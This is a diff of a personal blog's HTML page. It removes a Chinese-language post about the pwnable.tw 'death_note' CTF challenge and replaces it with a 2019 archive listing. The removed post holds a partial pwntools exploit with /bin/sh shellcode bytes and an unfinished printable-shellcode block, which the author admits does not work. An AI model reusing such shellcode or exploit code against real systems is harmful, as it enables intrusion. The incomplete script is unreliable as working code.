@@ -13,19 +13,18 @@
   
   
   
-  <title>pwnable.tw death_note | koocola&#39;s blog</title>
+  <title>Archives: 2019 | koocola&#39;s blog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="做个记号">
-<meta property="og:type" content="article">
-<meta property="og:title" content="pwnable.tw death_note">
-<meta property="og:url" content="http://yoursite.com/2018/09/30/death_note/index.html">
+  <meta name="description" content="koocola&apos;s blog">
+<meta property="og:type" content="website">
+<meta property="og:title" content="koocola&#39;s blog">
+<meta property="og:url" content="http://yoursite.com/archives/2019/index.html">
 <meta property="og:site_name" content="koocola&#39;s blog">
-<meta property="og:description" content="做个记号">
+<meta property="og:description" content="koocola&apos;s blog">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2019-02-02T01:39:44.322Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="pwnable.tw death_note">
-<meta name="twitter:description" content="做个记号">
+<meta name="twitter:title" content="koocola&#39;s blog">
+<meta name="twitter:description" content="koocola&apos;s blog">
   
   
     <link rel="icon" href="/css/images/favicon.ico">
@@ -66,62 +65,43 @@
     </nav>
 </header>
       <div id="main" class="wrapper">
-        <div id="primary" class="site-content"><div id="content" role="main"><article id="post-death_note" class="post-death_note post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
+        <div id="primary" class="site-content"><div id="content" role="main">
   
-    <h1 class="entry-title article-title">
-      pwnable.tw death_note
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2019" class="archive-year">2019</a>
+        </div>
+        <div class="archives">
+    
+    <article class="post type-post status-publish format-standard hentry archive-type-post">
+  <header class="entry-header">
+      
+  
+    <h1 class="entry-title">
+      <a class="archive-article-title" href="/2019/02/02/C++/">通过C++的异常机制绕过canary</a>
     </h1>
   
 
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://yoursite.com/2018/09/30/death_note/" data-id="cjrmtajlz000708tivkagclij" class="leave-reply bdsharebuttonbox" data-cmd="more"></a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>做个记号<br><a id="more"></a><br>    暂时能力还不够- -（solve)<br>    printable shellcode的编写真的太烧脑了，想了一天还是没写出来，看大师傅们的WP只能感叹思路的神奇，做个记录，以后再慢慢想<br>    ‘’’<br>    from pwn import <em><br>f=process(“./death_note”)<br>shellcode=”\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x00\x00\x00\x00”<br>def add(index,content):<br>    f.sendlineafter(“ :”,”1”)<br>    f.sendlineafter(“ :”,str(index))<br>    f.sendlineafter(“ :”,content)<br>def dele(index):<br>    f.sendlineafter(“ :”,”3”)<br>    f.sendlineafter(“ :”,str(index))<br>def show(index):<br>    f.sendlineafter(“ :”,”2”)<br>    f.sendlineafter(“ :”,str(index))<br>add(-15,”ppp”)<br>gdb.attach(f,’b </em>0x80484d0’)<br>add(-15,”\x01”)<br>shell=asm(“pop eax;<br>pop eax;<br>xor ax,0x2970;<br>xor ax,0x80;<br>xor ax,0x20;    #eax=addr<br>push eax;<br>pop ecx;<br>xor [ecx+ ?],”)<br>f.interactive()</p>
-<p>#0x8048A85<br>    ‘’’</p>
-<p>主要就是能够写入\xcd\x80,可以利用栈中的数据进行构造</p>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2018/09/30/death_note/">
-    <time datetime="2018-09-30T13:59:20.000Z" class="entry-date">
-        2018-09-30
+  </header>
+  <footer class="entry-meta">
+    <a href="/2019/02/02/C++/">
+    <time datetime="2019-02-02T01:13:20.000Z" class="entry-date">
+        2019-02-02
     </time>
 </a>
     
     
     </footer>
 </article>
-
-
-    
-<nav class="nav-single">
-    <h3 class="assistive-text">文章导航</h3>
-    
-        <span class="nav-previous"><a href="/2018/10/02/fastbin/" rel="prev"><span class="meta-nav">←</span> IO_FILE劫持总结</a></span>
-    
-    
-        <span class="nav-next"><a href="/2018/09/24/pwn_build/" rel="next">pwn环境的简单部署 <span class="meta-nav">→</span></a></span>
-    
-</nav><!-- .nav-single -->
-
-
-
-
-
-
+  
+  
+    </div></section>
+  
 
 </div></div>
         <div id="secondary" class="widget-area" role="complementary">
